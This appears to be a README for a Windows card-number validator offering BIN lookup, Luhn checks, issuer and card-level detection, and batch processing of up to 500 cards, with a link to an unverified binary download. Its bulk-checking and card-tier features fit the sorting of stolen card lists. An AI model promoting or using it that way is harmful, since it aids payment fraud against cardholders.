# CCValidator v2.4 — BIN Lookup + Card Validation

Free offline tool for card number analysis. BIN lookup, Luhn validation, card type detection, issuer identification. No API keys, no network calls, no logging.

## Features

- **BIN Lookup** — Bank name, country, card type from first 6 digits
- **Luhn Check** — Validate card number structure
- **Card Type Detection** — Visa, MC, Amex, Discover, JCB, UnionPay
- **Issuer Info** — Bank, country code, card level (Classic/Gold/Plat/Black)
- **Offline** — No API calls. No network. No logging.
- **Batch Mode** — Paste up to 500 cards, export CSV

## Download

[CCValidator v2.4 — Windows 64-bit](https://bloodshed-rain.github.io/cc-validator/) (8.0 MB)

## Usage

```
# Single card
ccvalidator 4532015112830366

# Batch file
ccvalidator -b cards.txt --output results.csv
```

## Supported BINs

200,000+ BINs. All major issuers. Updated July 2026.

## Disclaimer

Educational and security research tool only. Do not use with cards you don't own. Author not responsible for misuse.